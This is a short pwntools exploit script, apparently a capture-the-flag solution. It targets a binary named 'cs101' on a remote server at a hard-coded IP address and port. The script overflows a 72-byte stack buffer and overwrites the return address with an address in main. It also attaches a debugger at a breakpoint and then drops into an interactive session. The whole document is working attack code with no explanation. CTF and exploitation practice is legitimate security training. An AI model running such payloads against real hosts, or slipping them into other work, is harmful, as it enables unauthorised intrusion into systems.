from pwn import *
exe = ELF("./cs101")
r = remote("18.216.238.24", 1001)
gdb.attach(r, gdbscript = '''
           b*input+32
           c
           ''')
input()

payload = b"a" * 72 + p64(exe.sym['main'] + 1)
r.sendlineafter(b"Input Text:\n", payload)

r.interactive()